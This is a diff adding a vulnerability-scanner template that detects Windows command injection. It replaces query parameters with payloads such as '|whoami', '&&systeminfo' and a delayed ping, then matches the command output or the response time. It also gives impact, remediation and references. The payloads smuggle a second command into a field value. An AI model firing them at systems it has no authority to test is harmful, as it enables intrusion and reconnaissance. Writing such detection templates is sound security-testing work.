@@ -1,0 +1,94 @@
+id: windows-command-injection
+
+info:
+  name: Windows Command Injection - Generic Detection
+  author: Jaenact
+  severity: high
+  description: |
+    Detected potential OS command injection on Windows targets by replacing query parameter values with command separator payloads and identifying successful command execution through output patterns from `dir`, `whoami`, `systeminfo`, or response time delays induced via `ping`.
+  impact: |
+    Successful exploitation allows arbitrary command execution on the underlying Windows system, leading to full server compromise, data exfiltration, privilege escalation, and denial of service.
+  remediation: |
+    Never pass user-controlled input directly to cmd.exe or PowerShell. Use parameterized APIs or language-native functions instead of system()/exec(). Apply strict allowlist input validation and enforce least-privilege execution contexts for application processes.
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+    - https://cwe.mitre.org/data/definitions/78.html
+    - https://capec.mitre.org/data/definitions/88.html
+    - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-78
+  metadata:
+    verified: true
+    max-request: 14
+  tags: cmdi,dast,rce,windows,fuzz,vuln
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        # dir output
+        - "|dir"
+        - "&dir"
+        - "&&dir"
+        - "||dir"
+        - "|dir C:\\"
+        - "&&dir C:\\"
+        # identity
+        - "|whoami"
+        - "&&whoami"
+        # system enumeration
+        - "|systeminfo"
+        - "&&systeminfo"
+        - "|ipconfig"
+        - "&&ipconfig"
+        # time-based
+        - "&ping -n 5 127.0.0.1&"
+        - "&&ping -n 5 127.0.0.1&&"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: dir-output
+        part: body
+        regex:
+          - '(?mi)Directory of [A-Z]:\\\\'
+          - '(?mi)Volume in drive [A-Z]'
+
+      - type: regex
+        name: systeminfo-output
+        part: body
+        regex:
+          - '(?mi)^OS Name:\s+'
+          - '(?mi)^Host Name:\s+'
+
+      - type: regex
+        name: ipconfig-output
+        part: body
+        regex:
+          - '(?mi)Windows IP Configuration'
+
+      - type: regex
+        name: whoami-output
+        part: body
+        regex:
+          - '(?mi)^[a-z][-a-z0-9]*\\\\[a-z][-a-z0-9]*$'
+
+      - type: dsl
+        name: time-based
+        dsl:
+          - 'duration >= 4'
+# digest: 4b0a00483046022100be5c540b1ed2ddf5d5cd3c6b4beec3d046833f77b6a37ebf25d26259ddacd9b6022100ad9b2b4618589ef59eae4f0de6793fe8a59b1f67db65cdf31cf2a631465a3d91:922c64590222798bb761d5b6d8e72950
